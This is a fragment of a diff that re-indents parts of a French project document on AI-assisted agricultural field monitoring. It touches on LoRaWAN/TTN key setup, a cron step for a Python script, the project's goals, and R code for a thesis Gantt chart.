-By choosing DevEUI, AppEUI (unique on TTN), and AppKey with enough
-entropy that it can\'t be cracked (beware of MSB, LSB writing between
-dragin\_cayenne.py and TTN) Enfin pour executer le script python toutes
-les minutes :
+    By choosing DevEUI, AppEUI (unique on TTN), and AppKey with enough
+    entropy that it can\'t be cracked (beware of MSB, LSB writing between
+    dragin\_cayenne.py and TTN) Enfin pour executer le script python toutes
+    les minutes :
 
-``` {.sourceCode .bash}
-sudo crontab -e
+    ``` {.sourceCode .bash}
+    sudo crontab -e
 
 We select our favorite editor to add
 
@@ -2487,13 +2542,13 @@ utiliser le service cloud de WeeNat (<https://weenat.com/>) pour cette
 # 6 - Enjeux et anticipations:
 
 -   La surveillance et l’utilisation d’un champ agricole par EDGE-IA
-permettront de réduire les coûts pour l’utilisateur.
+    permettront de réduire les coûts pour l’utilisateur.
 -   Préservation de l’écosystème (avec la détection des maladies,
-l’agriculteur peut éviter d’utiliser des pesticides et ne traiter
-que les maladies qui affectent ses parcelles).
+    l’agriculteur peut éviter d’utiliser des pesticides et ne traiter
+    que les maladies qui affectent ses parcelles).
 -   Partager ses données en échange d’argent ou d’autres données.
 -   Apposer une étiquette indiquant qu’il n’a pas utilisé de pesticides
-et que ses cultures sont saines.
+    et que ses cultures sont saines.
 
 # 7 - Motivations
 
@@ -2550,31 +2605,31 @@ Cordialement,
 
 <!-- -->
 
-library(ggplot2)
-library(ggantt)
+    library(ggplot2)
+    library(ggantt)
 
-# Création de la structure de données
-taches <- data.frame(
-  tache = c("Analyse bibliographique", "Conception du plan de recherche", "Collecte de données", 
-"Analyse de données", "Rédaction du manuscrit", "Relecture et correction"),
-  debut = c(as.Date("2023-04-17"), as.Date("2023-07-01"), as.Date("2023-09-01"),
-as.Date("2024-06-01"), as.Date("2025-01-01"), as.Date("2025-09-01")),
-  fin = c(as.Date("2023-06-30"), as.Date("2024-05-31"), as.Date("2024-12-31"),
-  as.Date("2025-08-31"), as.Date("2026-05-31"), as.Date("2026-09-30")),
-  duree = as.numeric(as.Date(c("2023-06-30", "2024-05-31", "2024-12-31", "2025-08-31", "2026-05-31", "2026-09-30"))) - 
-as.numeric(as.Date(c("2023-04-17", "2023-07-01", "2023-09-01", "2024-06-01", "2025-01-01", "2025-09-01")))
-)
+    # Création de la structure de données
+    taches <- data.frame(
+      tache = c("Analyse bibliographique", "Conception du plan de recherche", "Collecte de données", 
+                "Analyse de données", "Rédaction du manuscrit", "Relecture et correction"),
+      debut = c(as.Date("2023-04-17"), as.Date("2023-07-01"), as.Date("2023-09-01"),
+                as.Date("2024-06-01"), as.Date("2025-01-01"), as.Date("2025-09-01")),
+      fin = c(as.Date("2023-06-30"), as.Date("2024-05-31"), as.Date("2024-12-31"),
+              as.Date("2025-08-31"), as.Date("2026-05-31"), as.Date("2026-09-30")),
+      duree = as.numeric(as.Date(c("2023-06-30", "2024-05-31", "2024-12-31", "2025-08-31", "2026-05-31", "2026-09-30"))) - 
+        as.numeric(as.Date(c("2023-04-17", "2023-07-01", "2023-09-01", "2024-06-01", "2025-01-01", "2025-09-01")))
+    )
 
-# Configuration du diagramme de Gantt
-g <- ggantt(taches, title="Gantt pour la réalisation du projet de thèse",
-calendar="western-calendar",
-date.breaks="1 month",
-y.labels=taches$tache,
-x.labels="",
-show.grid="months")
+    # Configuration du diagramme de Gantt
+    g <- ggantt(taches, title="Gantt pour la réalisation du projet de thèse",
+                calendar="western-calendar",
+                date.breaks="1 month",
+                y.labels=taches$tache,
+                x.labels="",
+                show.grid="months")
 
-# Affichage du diagramme
-g
+    # Affichage du diagramme
+    g
 
 # **Bibliograpy**
 
